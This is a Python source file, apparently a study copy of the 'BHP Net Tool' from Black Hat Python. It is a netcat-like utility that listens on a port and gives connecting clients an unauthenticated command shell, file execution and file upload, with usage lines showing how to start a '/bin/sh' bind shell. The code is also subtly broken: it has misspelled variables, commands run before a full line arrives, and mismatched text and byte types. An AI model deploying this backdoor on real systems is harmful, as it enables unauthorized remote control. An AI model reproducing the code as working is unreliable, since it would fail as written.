import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
	print("BHP Net Tool\n\n")
	print("Usage: python3 bhpnet.py -t target_host -p port\n\n")
	print("-l for listening on [host]:[port] incomming conncection\n\n")
	print("-e for executing a file on establish a connection\n\n")
	print("-c for initialing a command shell\n\n")
	print("-u for upload a file and write to [destination]\n\n")
	print("\n\n")
	print("Examples:\n\n")
	print("python3 bhpnet.py -t 192.168.1.10 -p 8034 -l -c\n\n")
	print("python3 bhpnet.py -t 192.168.1.10 -p 8034 -l -e=\ '/bin/sh' \ \n\n")
	print("python3 bhpnet.py -t 192.168.1.10 -p 8034 -l -u=\ 'C:\\tar.ex' \ \n\n")
	print("echo 'ABBCCCDDDD' | python3 bhpnet.py -t 192.168.1.10 -p 135 \n\n")
	sys.exit(0)

def client_sender(buffer):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		client.connect((target, port))
		if len(buffer):
			client.send(bytes(buffer, 'utf-8'))
	
		while True:
			recv_len = 1
			response = ""
	
			while recv_len:
				data = client.recv(4096)
				recv_len = len(data)
				response += data.decode('utf-8')
				if recv_len < 4096:
					break
					
			sys.stdout.write(response)
			buffer = input("")
			buffer += '\n'
			client.send(buffer.encode())
	
	except:
		print("[*] Exception! Existing.")
		client.close()

def server_loop():
	global target
	if not len(target):
		target = "0.0.0.0"
	
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target, port))
	server.listen(5)
	while True:
		client_socket, addr = server.accept()
		client_thread = threading.Thread(target=client_handler, args=(client_socket,))
		client_thread.start()

def run_command(command):
	command = command.rstrip()
	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
	except:
		output = "Failed to execute command.\r\n"
		
	return output

def client_handler(client_socket):
	global upload, execute, command
	if len(upload_destination):
		file_buffer = ""
		while True:
			data = client_socket.recv(1024)
			if not data.decode():
				break
			else:
				file_buffeer += data
		
		try:
			file_descriptor = open(uplod_destination,"wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()
			client_socket.send(bytes("Successsfully save file to %s \r\n" % upload_destination,'utf-8'))
		except:
			client_socket.send(bytes("Failed to save file to %s \r\n" % upload_destination, 'utf-8'))
	
	if len(execute):
		output = run_command(execute)
		client_socket.send(bytes(output,'utf-8'))
	
	if command:
		while True:
			client_socket.send(b"BHP:#> ")
			cmd_buffer = ""
			
			while "\n" not in cmd_buffer:
				temp = client_socket.recv(1024)
				cmd_buffer += temp.decode('utf-8')
				response = run_command(cmd_buffer)
				client_socket.send(response)

def main():
	global listen, command, upload_destination, target, port, execute
	if not len(sys.argv[1:]):
		usage()
	
	try:
		opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute=","target=","port=","command","upload="])
	except getopt.GetoptError as err:
		print(str(err))
		usage()
	
	for o, a in opts:
		if o in ("-h","--help"):
			usage()
		elif o in ("-l","--listen"):
			listen = True
		elif o in ("-e","--execute"):
			execute = a
		elif o in ("-c","--commandshell"):
			command = True
		elif o in ("-u","--upload_destination"):
			upload_destination = a
		elif o in ("-t","--target"):
			target = a
		elif o in ("-p","--port"):
			port = int(a)
		else:
			assert False, "Unhandled Option"
	
	if not listen and len(target) and port > 0:
		buffer = sys.stdin.read()
		client_sender(buffer)
	
	if listen:
		server_loop()

main()
